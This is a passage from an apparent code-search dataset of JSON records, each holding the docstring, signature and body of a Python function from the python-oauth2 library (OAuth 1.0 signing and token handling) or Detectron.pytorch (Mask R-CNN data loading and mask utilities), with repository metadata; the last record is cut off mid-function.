{"docstring": "\"\"\"Concatenates the consumer key and secret with the token's\nsecret.\"\"\"\n", "func_signal": "def signing_base(self, request, consumer, token):\n", "code": "sig = '%s&' % escape(consumer.secret)\nif token:\n    sig = sig + escape(token.secret)\nreturn sig, sig", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Returns a Client object if this is a valid OAuth request.\"\"\"\n\n", "func_signal": "def is_valid(self):\n", "code": "try:\n    request = self.get_oauth_request()\n    client = self.get_client(request)\n    params = self._server.verify_request(request, client, None)\nexcept Exception as e:\n    raise e\n\nreturn client", "path": "python-oauth2/example/appengine_oauth.py", "commit_date": "2013-05-29 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Deserializes a token from a string like one returned by\n`to_string()`.\"\"\"\n\n", "func_signal": "def from_string(s):\n", "code": "if not len(s):\n    raise ValueError(\"Invalid parameter string.\")\n\nparams = parse_qs(u(s), keep_blank_values=False)\nif not len(params):\n    raise ValueError(\"Invalid parameter string.\")\n\ntry:\n    key = params['oauth_token'][0]\nexcept Exception:\n    raise ValueError(\"'oauth_token' not found in OAuth request.\")\n\ntry:\n    secret = params['oauth_token_secret'][0]\nexcept Exception:\n    raise ValueError(\"'oauth_token_secret' not found in \" \n        \"OAuth request.\")\n\ntoken = Token(key, secret)\ntry:\n    token.callback_confirmed = params['oauth_callback_confirmed'][0]\nexcept KeyError:\n    pass  # 1.0, no callback confirmed.\nreturn token", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Builds the base signature string.\"\"\"\n", "func_signal": "def sign(self, request, consumer, token):\n", "code": "key, raw = self.signing_base(request, consumer, token)\n\nhashed = hmac.new(key, raw, sha1)\n\n# Calculate the digest base 64.\nreturn binascii.b2a_base64(hashed.digest())[:-1]", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Return the client from the OAuth parameters.\"\"\"\n\n", "func_signal": "def get_client(self, request=None):\n", "code": "if not isinstance(request, oauth.Request):\n    request = self.get_oauth_request()\nclient_key = request.get_parameter('oauth_consumer_key')\nif not client_key:\n    raise Exception('Missing \"oauth_consumer_key\" parameter in ' \\\n        'OAuth \"Authorization\" header')\n\nclient = models.Client.get_by_key_name(client_key)\nif not client:\n    raise Exception('Client \"%s\" not found.' % client_key)\n\nreturn client", "path": "python-oauth2/example/appengine_oauth.py", "commit_date": "2013-05-29 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Turn Authorization: header into parameters.\"\"\"\n", "func_signal": "def _split_header(header):\n", "code": "params = {}\nparts = header.split(',')\nfor param in parts:\n    # Ignore realm parameter.\n    if param.find('realm') > -1:\n        continue\n    # Remove whitespace.\n    param = param.strip()\n    # Split key-value.\n    param_parts = param.split('=', 1)\n    # Remove quotes and unescape the value.\n    params[param_parts[0]] = unquote(param_parts[1].strip('\\\"'))\nreturn params", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Returns this token as a plain string, suitable for storage.\n \nThe resulting string includes the token's secret, so you should never\nsend or store this string where a third party can read it.\n\"\"\"\n", "func_signal": "def to_string(self):\n", "code": "items = [\n    ('oauth_token', self.key),\n    ('oauth_token_secret', self.secret),\n]\n\nif self.callback_confirmed is not None:\n    items.append(('oauth_callback_confirmed', self.callback_confirmed))\nreturn urlencode(items)", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Serialize as post data for a POST request.\"\"\"\n", "func_signal": "def to_postdata(self):\n", "code": "items = []\nfor k, v in sorted(self.items()): # predictable for testing\n    items.append((k.encode('utf-8'), to_utf8_optional_iterator(v)))\n\n# tell urlencode to deal with sequence values and map them correctly\n# to resulting querystring. for example self[\"k\"] = [\"v1\", \"v2\"] will\n# result in 'k=v1&k=v2' and not k=%5B%27v1%27%2C+%27v2%27%5D\nreturn urlencode(items, True).replace('+', '%20')", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Escape a URL including any /.\"\"\"\n", "func_signal": "def escape(s):\n", "code": "if not isinstance(s, bytes):\n    s = s.encode('utf-8')\nreturn quote(s, safe='~')", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"\nRaise TypeError if x is a str or if x is an iterable which\ncontains a str.\n\"\"\"\n", "func_signal": "def to_utf8_optional_iterator(x):\n", "code": "if isinstance(x, STRING_TYPES):\n    return to_utf8(x)\n\ntry:\n    l = list(x)\nexcept TypeError as e:\n    assert 'is not iterable' in str(e)\n    return x\nelse:\n    return [ to_utf8_if_string(e) for e in l ]", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Set the signature parameter to the result of sign.\"\"\"\n\n", "func_signal": "def sign_request(self, signature_method, consumer, token):\n", "code": "if not self.is_form_encoded:\n    # according to\n    # http://oauth.googlecode.com/svn/spec/ext/body_hash/1.0/oauth-bodyhash.html\n    # section 4.1.1 \"OAuth Consumers MUST NOT include an\n    # oauth_body_hash parameter on requests with form-encoded\n    # request bodies.\"\n    if not self.body:\n       self.body = ''\n    self['oauth_body_hash'] = base64.b64encode(sha1(to_utf8(self.body)).digest())\n\nif 'oauth_consumer_key' not in self:\n    self['oauth_consumer_key'] = consumer.key\n\nif token and 'oauth_token' not in self:\n    self['oauth_token'] = token.key\n\nself['oauth_signature_method'] = signature_method.name\nself['oauth_signature'] = signature_method.sign(self, consumer, token)", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "# via headers\n# -> OAuthToken\n", "func_signal": "def fetch_access_token(self, oauth_request):\n", "code": "self.connection.request(oauth_request.http_method,\n    self.access_token_url, headers=oauth_request.to_header()) \nresponse = self.connection.getresponse()\nreturn oauth.OAuthToken.from_string(response.read())", "path": "python-oauth2/example/client.py", "commit_date": "2013-05-29 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Return a string that contains the parameters that must be signed.\"\"\"\n", "func_signal": "def get_normalized_parameters(self):\n", "code": "items = []\nfor key, value in self.items():\n    if key == 'oauth_signature':\n        continue\n    # 1.0a/9.1.1 states that kvp must be sorted by key, then by value,\n    # so we unpack sequence values into multiple items for sorting.\n    if isinstance(value, STRING_TYPES):\n        items.append((to_utf8_if_string(key), to_utf8(value)))\n    else:\n        try:\n            value = list(value)\n        except TypeError as e:\n            assert 'is not iterable' in str(e)\n            items.append((to_utf8_if_string(key), to_utf8_if_string(value)))\n        else:\n            items.extend((to_utf8_if_string(key), to_utf8_if_string(item)) for item in value)\n\n# Include any query string parameters from the provided URL\nquery = urlparse(self.url)[4]\n\nurl_items = self._split_url_string(query).items()\nurl_items = [(to_utf8(k), to_utf8_optional_iterator(v)) for k, v in url_items if k != 'oauth_signature' ]\nitems.extend(url_items)\n\nitems.sort()\nencoded_str = urlencode(items, True)\n# Encode signature parameters per Oauth Core 1.0 protocol\n# spec draft 7, section 3.6\n# (http://tools.ietf.org/html/draft-hammer-oauth-07#section-3.6)\n# Spaces must be encoded with \"%20\" instead of \"+\"\nreturn encoded_str.replace('+', '%20').replace('%7E', '~')", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\" Get root output directory for each run \"\"\"\n", "func_signal": "def get_output_dir(args, run_name):\n", "code": "cfg_filename, _ = os.path.splitext(os.path.split(args.cfg_file)[1])\nreturn os.path.join(cfg.OUTPUT_DIR, cfg_filename, run_name)", "path": "Detectron.pytorch/lib/utils/misc.py", "commit_date": "2018-05-05 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Fast R-CNN blob names.\"\"\"\n# rois blob: holds R regions of interest, each is a 5-tuple\n# (batch_idx, x1, y1, x2, y2) specifying an image batch index and a\n# rectangle (x1, y1, x2, y2)\n", "func_signal": "def get_fast_rcnn_blob_names(is_training=True):\n", "code": "blob_names = ['rois']\nif is_training:\n    # labels_int32 blob: R categorical labels in [0, ..., K] for K\n    # foreground classes plus background\n    blob_names += ['labels_int32']\nif is_training:\n    # bbox_targets blob: R bounding-box regression targets with 4\n    # targets per class\n    blob_names += ['bbox_targets']\n    # bbox_inside_weights blob: At most 4 targets per roi are active\n    # this binary vector sepcifies the subset of active targets\n    blob_names += ['bbox_inside_weights']\n    blob_names += ['bbox_outside_weights']\nif is_training and cfg.MODEL.MASK_ON:\n    # 'mask_rois': RoIs sampled for training the mask prediction branch.\n    # Shape is (#masks, 5) in format (batch_idx, x1, y1, x2, y2).\n    blob_names += ['mask_rois']\n    # 'roi_has_mask': binary labels for the RoIs specified in 'rois'\n    # indicating if each RoI has a mask or not. Note that in some cases\n    # a *bg* RoI will have an all -1 (ignore) mask associated with it in\n    # the case that no fg RoIs can be sampled. Shape is (batchsize).\n    blob_names += ['roi_has_mask_int32']\n    # 'masks_int32' holds binary masks for the RoIs specified in\n    # 'mask_rois'. Shape is (#fg, M * M) where M is the ground truth\n    # mask size.\n    # if cfg.MRCNN.CLS_SPECIFIC_MASK: Shape is (#masks, #classes * M ** 2)\n    blob_names += ['masks_int32']\nif is_training and cfg.MODEL.KEYPOINTS_ON:\n    # 'keypoint_rois': RoIs sampled for training the keypoint prediction\n    # branch. Shape is (#instances, 5) in format (batch_idx, x1, y1, x2,\n    # y2).\n    blob_names += ['keypoint_rois']\n    # 'keypoint_locations_int32': index of keypoint in\n    # KRCNN.HEATMAP_SIZE**2 sized array. Shape is (#instances * #keypoints). Used in\n    # SoftmaxWithLoss.\n    blob_names += ['keypoint_locations_int32']\n    # 'keypoint_weights': weight assigned to each target in\n    # 'keypoint_locations_int32'. Shape is (#instances * #keypoints). Used in\n    # SoftmaxWithLoss.\n    blob_names += ['keypoint_weights']\n    # 'keypoint_loss_normalizer': optional normalization factor to use if\n    # cfg.KRCNN.NORMALIZE_BY_VISIBLE_KEYPOINTS is False.\n    blob_names += ['keypoint_loss_normalizer']\nif cfg.FPN.FPN_ON and cfg.FPN.MULTILEVEL_ROIS:\n    # Support for FPN multi-level rois without bbox reg isn't\n    # implemented (... and may never be implemented)\n    k_max = cfg.FPN.ROI_MAX_LEVEL\n    k_min = cfg.FPN.ROI_MIN_LEVEL\n    # Same format as rois blob, but one per FPN level\n    for lvl in range(k_min, k_max + 1):\n        blob_names += ['rois_fpn' + str(lvl)]\n    blob_names += ['rois_idx_restore_int32']\n    if is_training:\n        if cfg.MODEL.MASK_ON:\n            for lvl in range(k_min, k_max + 1):\n                blob_names += ['mask_rois_fpn' + str(lvl)]\n            blob_names += ['mask_rois_idx_restore_int32']\n        if cfg.MODEL.KEYPOINTS_ON:\n            for lvl in range(k_min, k_max + 1):\n                blob_names += ['keypoint_rois_fpn' + str(lvl)]\n            blob_names += ['keypoint_rois_idx_restore_int32']\nreturn blob_names", "path": "Detectron.pytorch/lib/roi_data/fast_rcnn.py", "commit_date": "2018-05-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Left/right flip each mask in a list of masks.\"\"\"\n\n", "func_signal": "def flip_segms(segms, height, width):\n", "code": "def _flip_poly(poly, width):\n  flipped_poly = np.array(poly)\n  flipped_poly[0::2] = width - np.array(poly[0::2]) - 1\n  return flipped_poly.tolist()\n\ndef _flip_rle(rle, height, width):\n  if 'counts' in rle and type(rle['counts']) == list:\n    # Magic RLE format handling painfully discovered by looking at the\n    # COCO API showAnns function.\n    rle = mask_util.frPyObjects([rle], height, width)\n  mask = mask_util.decode(rle)\n  mask = mask[:, ::-1, :]\n  rle = mask_util.encode(np.array(mask, order='F', dtype=np.uint8))\n  return rle\n\nflipped_segms = []\nfor segm in segms:\n  if type(segm) == list:\n    # Polygon format\n    flipped_segms.append([_flip_poly(poly, width) for poly in segm])\n  else:\n    # RLE format\n    assert type(segm) == dict\n    flipped_segms.append(_flip_rle(segm, height, width))\nreturn flipped_segms", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Checks if a file is an image.\n  Args:\n      filename (string): path to a file\n  Returns:\n      bool: True if the filename ends with a known image extension\n\"\"\"\n", "func_signal": "def is_image_file(filename):\n", "code": "filename_lower = filename.lower()\nreturn any(filename_lower.endswith(ext) for ext in IMG_EXTENSIONS)", "path": "Detectron.pytorch/lib/utils/misc.py", "commit_date": "2018-05-05 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\" A unique name for each run \"\"\"\n", "func_signal": "def get_run_name():\n", "code": "return datetime.now().strftime(\n    '%b%d-%H-%M-%S') + '_' + socket.gethostname()", "path": "Detectron.pytorch/lib/utils/misc.py", "commit_date": "2018-05-05 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Builds an input blob from the images in the roidb at the specified\nscales.\n\"\"\"\n", "func_signal": "def _get_image_blob(roidb):\n", "code": "num_images = len(roidb)\n# Sample random scales to use for each image in this batch\nscale_inds = np.random.randint(\n    0, high=len(cfg.TRAIN.SCALES), size=num_images)\nprocessed_ims = []\nim_scales = []\nfor i in range(num_images):\n    im = cv2.imread(roidb[i]['image'])\n    assert im is not None, \\\n        'Failed to read image \\'{}\\''.format(roidb[i]['image'])\n    # If NOT using opencv to read in images, uncomment following lines\n    # if len(im.shape) == 2:\n    #     im = im[:, :, np.newaxis]\n    #     im = np.concatenate((im, im, im), axis=2)\n    # # flip the channel, since the original one using cv2\n    # # rgb -> bgr\n    # im = im[:, :, ::-1]\n    if roidb[i]['flipped']:\n        im = im[:, ::-1, :]\n    target_size = cfg.TRAIN.SCALES[scale_inds[i]]\n    im, im_scale = blob_utils.prep_im_for_blob(\n        im, cfg.PIXEL_MEANS, [target_size], cfg.TRAIN.MAX_SIZE)\n    im_scales.append(im_scale[0])\n    processed_ims.append(im[0])\n\n# Create a blob to hold the input images [n, c, h, w]\nblob = blob_utils.im_list_to_blob(processed_ims)\n\nreturn blob, im_scales", "path": "Detectron.pytorch/lib/roi_data/minibatch.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Given a roidb, construct a minibatch sampled from it.\"\"\"\n# We collect blobs from each image onto a list and then concat them into a\n# single tensor, hence we initialize each blob to an empty list\n", "func_signal": "def get_minibatch(roidb):\n", "code": "blobs = {k: [] for k in get_minibatch_blob_names()}\n\n# Get the input image blob\nim_blob, im_scales = _get_image_blob(roidb)\nblobs['data'] = im_blob\nif cfg.RPN.RPN_ON:\n    # RPN-only or end-to-end Faster/Mask R-CNN\n    valid = roi_data.rpn.add_rpn_blobs(blobs, im_scales, roidb)\nelif cfg.RETINANET.RETINANET_ON:\n    raise NotImplementedError\nelse:\n    # Fast R-CNN like models trained on precomputed proposals\n    valid = roi_data.fast_rcnn.add_fast_rcnn_blobs(blobs, im_scales, roidb)\nreturn blobs, valid", "path": "Detectron.pytorch/lib/roi_data/minibatch.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Add blobs needed for training Fast R-CNN style models.\"\"\"\n# Sample training RoIs from each image and append them to the blob lists\n", "func_signal": "def add_fast_rcnn_blobs(blobs, im_scales, roidb):\n", "code": "for im_i, entry in enumerate(roidb):\n    frcn_blobs = _sample_rois(entry, im_scales[im_i], im_i)\n    for k, v in frcn_blobs.items():\n        blobs[k].append(v)\n# Concat the training blob lists into tensors\nfor k, v in blobs.items():\n    if isinstance(v, list) and len(v) > 0:\n        blobs[k] = np.concatenate(v)\n# Add FPN multilevel training RoIs, if configured\nif cfg.FPN.FPN_ON and cfg.FPN.MULTILEVEL_ROIS:\n    _add_multilevel_rois(blobs)\n\n# Perform any final work and validity checks after the collating blobs for\n# all minibatch images\nvalid = True\nif cfg.MODEL.KEYPOINTS_ON:\n    valid = roi_data.keypoint_rcnn.finalize_keypoint_minibatch(blobs, valid)\n\nreturn valid", "path": "Detectron.pytorch/lib/roi_data/fast_rcnn.py", "commit_date": "2018-05-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Bounding-box regression targets are stored in a compact form in the\nroidb.\n\nThis function expands those targets into the 4-of-4*K representation used\nby the network (i.e. only one class has non-zero targets). The loss weights\nare similarly expanded.\n\nReturns:\n    bbox_target_data (ndarray): N x 4K blob of regression targets\n    bbox_inside_weights (ndarray): N x 4K blob of loss weights\n\"\"\"\n", "func_signal": "def _expand_bbox_targets(bbox_target_data):\n", "code": "num_bbox_reg_classes = cfg.MODEL.NUM_CLASSES\nif cfg.MODEL.CLS_AGNOSTIC_BBOX_REG:\n    num_bbox_reg_classes = 2  # bg and fg\n\nclss = bbox_target_data[:, 0]\nbbox_targets = blob_utils.zeros((clss.size, 4 * num_bbox_reg_classes))\nbbox_inside_weights = blob_utils.zeros(bbox_targets.shape)\ninds = np.where(clss > 0)[0]\nfor ind in inds:\n    cls = int(clss[ind])\n    start = 4 * cls\n    end = start + 4\n    bbox_targets[ind, start:end] = bbox_target_data[ind, 1:]\n    bbox_inside_weights[ind, start:end] = (1.0, 1.0, 1.0, 1.0)\nreturn bbox_targets, bbox_inside_weights", "path": "Detectron.pytorch/lib/roi_data/fast_rcnn.py", "commit_date": "2018-05-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Add Mask R-CNN specific blobs to the input blob dictionary.\"\"\"\n# Prepare the mask targets by associating one gt mask to each training roi\n# that has a fg (non-bg) class label.\n", "func_signal": "def add_mask_rcnn_blobs(blobs, sampled_boxes, roidb, im_scale, batch_idx):\n", "code": "M = cfg.MRCNN.RESOLUTION\npolys_gt_inds = np.where((roidb['gt_classes'] > 0) &\n                         (roidb['is_crowd'] == 0))[0]\npolys_gt = [roidb['segms'][i] for i in polys_gt_inds]\nboxes_from_polys = segm_utils.polys_to_boxes(polys_gt)\n# boxes_from_polys = [roidb['boxes'][i] for i in polys_gt_inds]\nfg_inds = np.where(blobs['labels_int32'] > 0)[0]\nroi_has_mask = blobs['labels_int32'].copy()\nroi_has_mask[roi_has_mask > 0] = 1\n\nif fg_inds.shape[0] > 0:\n    # Class labels for the foreground rois\n    mask_class_labels = blobs['labels_int32'][fg_inds]\n    masks = blob_utils.zeros((fg_inds.shape[0], M**2), int32=True)\n\n    # Find overlap between all foreground rois and the bounding boxes\n    # enclosing each segmentation\n    rois_fg = sampled_boxes[fg_inds]\n    overlaps_bbfg_bbpolys = box_utils.bbox_overlaps(\n        rois_fg.astype(np.float32, copy=False),\n        boxes_from_polys.astype(np.float32, copy=False))\n    # Map from each fg rois to the index of the mask with highest overlap\n    # (measured by bbox overlap)\n    fg_polys_inds = np.argmax(overlaps_bbfg_bbpolys, axis=1)\n\n    # add fg targets\n    for i in range(rois_fg.shape[0]):\n        fg_polys_ind = fg_polys_inds[i]\n        poly_gt = polys_gt[fg_polys_ind]\n        roi_fg = rois_fg[i]\n        # Rasterize the portion of the polygon mask within the given fg roi\n        # to an M x M binary image\n        mask = segm_utils.polys_to_mask_wrt_box(poly_gt, roi_fg, M)\n        mask = np.array(mask > 0, dtype=np.int32)  # Ensure it's binary\n        masks[i, :] = np.reshape(mask, M**2)\nelse:  # If there are no fg masks (it does happen)\n    # The network cannot handle empty blobs, so we must provide a mask\n    # We simply take the first bg roi, given it an all -1's mask (ignore\n    # label), and label it with class zero (bg).\n    bg_inds = np.where(blobs['labels_int32'] == 0)[0]\n    # rois_fg is actually one background roi, but that's ok because ...\n    rois_fg = sampled_boxes[bg_inds[0]].reshape((1, -1))\n    # We give it an -1's blob (ignore label)\n    masks = -blob_utils.ones((1, M**2), int32=True)\n    # We label it with class = 0 (background)\n    mask_class_labels = blob_utils.zeros((1, ))\n    # Mark that the first roi has a mask\n    roi_has_mask[0] = 1\n\nif cfg.MRCNN.CLS_SPECIFIC_MASK:\n    masks = _expand_to_class_specific_mask_targets(masks,\n                                                   mask_class_labels)\n\n# Scale rois_fg and format as (batch_idx, x1, y1, x2, y2)\nrois_fg *= im_scale\nrepeated_batch_idx = batch_idx * blob_utils.ones((rois_fg.shape[0], 1))\nrois_fg = np.hstack((repeated_batch_idx, rois_fg))\n\n# Update blobs dict with Mask R-CNN blobs\nblobs['mask_rois'] = rois_fg\nblobs['roi_has_mask_int32'] = roi_has_mask\nblobs['masks_int32'] = masks", "path": "Detectron.pytorch/lib/roi_data/mask_rcnn.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Expand masks from shape (#masks, M ** 2) to (#masks, #classes * M ** 2)\nto encode class specific mask targets.\n\"\"\"\n", "func_signal": "def _expand_to_class_specific_mask_targets(masks, mask_class_labels):\n", "code": "assert masks.shape[0] == mask_class_labels.shape[0]\nM = cfg.MRCNN.RESOLUTION\n\n# Target values of -1 are \"don't care\" / ignore labels\nmask_targets = -blob_utils.ones(\n    (masks.shape[0], cfg.MODEL.NUM_CLASSES * M**2), int32=True)\n\nfor i in range(masks.shape[0]):\n    cls = int(mask_class_labels[i])\n    start = M**2 * cls\n    end = start + M**2\n    # Ignore background instance\n    # (only happens when there is no fg samples in an image)\n    if cls > 0:\n        mask_targets[i, start:end] = masks[i, :]\n\nreturn mask_targets", "path": "Detectron.pytorch/lib/roi_data/mask_rcnn.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Return blob names in the order in which they are read by the data loader.\n\"\"\"\n# data blob: holds a batch of N images, each with 3 channels\n", "func_signal": "def get_minibatch_blob_names(is_training=True):\n", "code": "blob_names = ['data']\nif cfg.RPN.RPN_ON:\n    # RPN-only or end-to-end Faster R-CNN\n    blob_names += roi_data.rpn.get_rpn_blob_names(is_training=is_training)\nelif cfg.RETINANET.RETINANET_ON:\n    raise NotImplementedError\nelse:\n    # Fast R-CNN like models trained on precomputed proposals\n    blob_names += roi_data.fast_rcnn.get_fast_rcnn_blob_names(\n        is_training=is_training\n    )\nreturn blob_names", "path": "Detectron.pytorch/lib/roi_data/minibatch.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Convert from the COCO polygon segmentation format to a binary mask\n  encoded as a 2D array of data type numpy.float32. The polygon segmentation\n  is understood to be enclosed in the given box and rasterized to an M x M\n  mask. The resulting mask is therefore of shape (M, M).\n  \"\"\"\n", "func_signal": "def polys_to_mask_wrt_box(polygons, box, M):\n", "code": "w = box[2] - box[0]\nh = box[3] - box[1]\n\nw = np.maximum(w, 1)\nh = np.maximum(h, 1)\n\npolygons_norm = []\nfor poly in polygons:\n  p = np.array(poly, dtype=np.float32)\n  p[0::2] = (p[0::2] - box[0]) * M / w\n  p[1::2] = (p[1::2] - box[1]) * M / h\n  polygons_norm.append(p)\n\nrle = mask_util.frPyObjects(polygons_norm, M, M)\nmask = np.array(mask_util.decode(rle), dtype=np.float32)\n# Flatten in case polygons was a list\nmask = np.sum(mask, axis=2)\nmask = np.array(mask > 0, dtype=np.float32)\nreturn mask", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Convert from the COCO polygon segmentation format to a binary mask\n  encoded as a 2D array of data type numpy.float32. The polygon segmentation\n  is understood to be enclosed inside a height x width image. The resulting\n  mask is therefore of shape (height, width).\n  \"\"\"\n", "func_signal": "def polys_to_mask(polygons, height, width):\n", "code": "rle = mask_util.frPyObjects(polygons, height, width)\nmask = np.array(mask_util.decode(rle), dtype=np.float32)\n# Flatten in case polygons was a list\nmask = np.sum(mask, axis=2)\nmask = np.array(mask > 0, dtype=np.float32)\nreturn mask", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Set matplotlib up.\"\"\"\n", "func_signal": "def set_up_matplotlib():\n", "code": "import matplotlib\n# Use a non-interactive backend\nmatplotlib.use('Agg')", "path": "Detectron.pytorch/lib/utils/env.py", "commit_date": "2018-04-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Performs greedy non-maximum suppression based on an overlap measurement\n  between masks. The type of measurement is determined by `mode` and can be\n  either 'IOU' (standard intersection over union) or 'IOMA' (intersection over\n  mininum area).\n  \"\"\"\n", "func_signal": "def rle_mask_nms(masks, dets, thresh, mode='IOU'):\n", "code": "if len(masks) == 0:\n  return []\nif len(masks) == 1:\n  return [0]\n\nif mode == 'IOU':\n  # Computes ious[m1, m2] = area(intersect(m1, m2)) / area(union(m1, m2))\n  all_not_crowds = [False] * len(masks)\n  ious = mask_util.iou(masks, masks, all_not_crowds)\nelif mode == 'IOMA':\n  # Computes ious[m1, m2] = area(intersect(m1, m2)) / min(area(m1), area(m2))\n  all_crowds = [True] * len(masks)\n  # ious[m1, m2] = area(intersect(m1, m2)) / area(m2)\n  ious = mask_util.iou(masks, masks, all_crowds)\n  # ... = max(area(intersect(m1, m2)) / area(m2),\n  #           area(intersect(m2, m1)) / area(m1))\n  ious = np.maximum(ious, ious.transpose())\nelif mode == 'CONTAINMENT':\n  # Computes ious[m1, m2] = area(intersect(m1, m2)) / area(m2)\n  # Which measures how much m2 is contained inside m1\n  all_crowds = [True] * len(masks)\n  ious = mask_util.iou(masks, masks, all_crowds)\nelse:\n  raise NotImplementedError('Mode {} is unknown'.format(mode))\n\nscores = dets[:, 4]\norder = np.argsort(-scores)\n\nkeep = []\nwhile order.size > 0:\n  i = order[0]\n  keep.append(i)\n  ovr = ious[i, order[1:]]\n  inds_to_keep = np.where(ovr <= thresh)[0]\n  order = order[inds_to_keep + 1]\n\nreturn keep", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Generate a random sample of RoIs comprising foreground and background\nexamples.\n\"\"\"\n", "func_signal": "def _sample_rois(roidb, im_scale, batch_idx):\n", "code": "rois_per_image = int(cfg.TRAIN.BATCH_SIZE_PER_IM)\nfg_rois_per_image = int(np.round(cfg.TRAIN.FG_FRACTION * rois_per_image))\nmax_overlaps = roidb['max_overlaps']\n\n# Select foreground RoIs as those with >= FG_THRESH overlap\nfg_inds = np.where(max_overlaps >= cfg.TRAIN.FG_THRESH)[0]\n# Guard against the case when an image has fewer than fg_rois_per_image\n# foreground RoIs\nfg_rois_per_this_image = np.minimum(fg_rois_per_image, fg_inds.size)\n# Sample foreground regions without replacement\nif fg_inds.size > 0:\n    fg_inds = npr.choice(\n        fg_inds, size=fg_rois_per_this_image, replace=False)\n\n# Select background RoIs as those within [BG_THRESH_LO, BG_THRESH_HI)\nbg_inds = np.where((max_overlaps < cfg.TRAIN.BG_THRESH_HI) &\n                   (max_overlaps >= cfg.TRAIN.BG_THRESH_LO))[0]\n# Compute number of background RoIs to take from this image (guarding\n# against there being fewer than desired)\nbg_rois_per_this_image = rois_per_image - fg_rois_per_this_image\nbg_rois_per_this_image = np.minimum(bg_rois_per_this_image, bg_inds.size)\n# Sample foreground regions without replacement\nif bg_inds.size > 0:\n    bg_inds = npr.choice(\n        bg_inds, size=bg_rois_per_this_image, replace=False)\n\n# The indices that we're selecting (both fg and bg)\nkeep_inds = np.append(fg_inds, bg_inds)\n# Label is the class each RoI has max overlap with\nsampled_labels = 